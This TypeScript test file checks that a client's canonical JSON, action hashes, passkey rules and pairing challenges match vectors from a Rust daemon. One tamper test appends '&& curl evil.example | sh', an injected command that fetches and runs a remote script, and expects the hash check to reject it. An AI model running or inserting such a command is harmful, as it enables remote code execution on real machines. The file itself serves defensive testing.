// The TypeScript half of the cross-language contract: every value in protocol/remote-vectors.json, which the
// Rust side generated and also checks, must come out of this code byte for byte.

import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { hashMatches, needsFreshPasskey, type Card, type Envelope } from '../src/crypto/approval';
import { b64u, toHex, utf8 } from '../src/crypto/bytes';
import { canonical, type Json } from '../src/crypto/canonical';
import { daemonIdOf, decisionMessage, fingerprint, pairChallenge, sasCode, unlockChallenge } from '../src/crypto/session';

const vectors = JSON.parse(readFileSync(new URL('../../protocol/remote-vectors.json', import.meta.url), 'utf8'));
const fromHex = (text: string): Uint8Array<ArrayBuffer> => Uint8Array.from(text.match(/../g)?.map((pair) => parseInt(pair, 16)) ?? []);

describe('canonical JSON', () => {
  for (const item of vectors.canonical) {
    it(`reproduces: ${item.name}`, async () => {
      expect(canonical(item.input as Json)).toBe(item.canonical);
      expect(toHex(new Uint8Array(await crypto.subtle.digest('SHA-256', utf8(item.canonical))))).toBe(item.sha256);
    });
  }

  it('refuses floats and unsafe integers', () => {
    expect(() => canonical(0.04)).toThrow();
    expect(() => canonical(9007199254740992)).toThrow();
    expect(() => canonical({ cost: 1.5 })).toThrow();
    expect(canonical(-0)).toBe('0');
  });
});

describe('the action envelope', () => {
  it('has the same canonical form and hash as the daemon computed', async () => {
    const { input, canonical: expected, action_hash_hex: hashHex, action_hash_b64u: hashB64 } = vectors.envelope;

    expect(canonical(input as Json)).toBe(expected);

    const digest = new Uint8Array(await crypto.subtle.digest('SHA-256', utf8(expected)));

    expect(toHex(digest)).toBe(hashHex);
    expect(b64u(digest)).toBe(hashB64);
  });

  it('checks a card against its own hash before anything is signed', async () => {
    const card: Card = { envelope: vectors.envelope.input as Envelope, action_hash: vectors.envelope.action_hash_b64u };

    expect(await hashMatches(card)).toBe(true);
    expect(await hashMatches({ ...card, envelope: { ...card.envelope, target: `${card.envelope.target} && curl evil.example | sh` } })).toBe(false);
    expect(await hashMatches({ ...card, envelope: { ...card.envelope, host: 'another-host' } })).toBe(false);
    expect(await hashMatches({ ...card, action_hash: 'AAAA' })).toBe(false);
  });

  it('asks for a fresh passkey for the same actions the daemon does', () => {
    expect(needsFreshPasskey({ risk: 'DANGEROUS', action: 'run' })).toBe(true);
    expect(needsFreshPasskey({ risk: 'MUTATING', action: 'delete' })).toBe(true);
    expect(needsFreshPasskey({ risk: 'MUTATING', action: 'deploy' })).toBe(true);
    expect(needsFreshPasskey({ risk: 'MUTATING', action: 'rewind' })).toBe(true);
    expect(needsFreshPasskey({ risk: 'MUTATING', action: 'run' })).toBe(false);
    expect(needsFreshPasskey({ risk: 'SAFE', action: 'edit' })).toBe(false);
  });
});

describe('values derived from shared inputs', () => {
  const d = vectors.derived;

  it('daemon id and fingerprint', async () => {
    const identity = fromHex(d.identity_public_hex);

    expect(await daemonIdOf(identity)).toBe(d.daemon_id);
    expect(await fingerprint(identity)).toBe(d.fingerprint);
  });

  it('the six pairing digits', async () => {
    expect(await sasCode(d.sas_token, fromHex(d.device_public_hex), fromHex(d.identity_public_hex))).toBe(d.sas_code);
  });

  it('the pairing challenge', async () => {
    expect(toHex(await pairChallenge(d.pair_nonce))).toBe(d.pair_challenge_hex);
  });

  it('the unlock challenges, one per level', async () => {
    const nonce = fromHex(d.unlock_nonce_hex);

    expect(toHex(await unlockChallenge('view', nonce))).toBe(d.unlock_challenge_view_hex);
    expect(toHex(await unlockChallenge('operate', nonce))).toBe(d.unlock_challenge_operate_hex);
  });

  it('what a device signs for a decision', () => {
    const hash = fromHex(d.decision_hash_hex);

    expect(toHex(decisionMessage(hash, 'allow_once'))).toBe(d.decision_allow_message_hex);
    expect(toHex(decisionMessage(hash, 'deny'))).toBe(d.decision_deny_message_hex);
  });
});
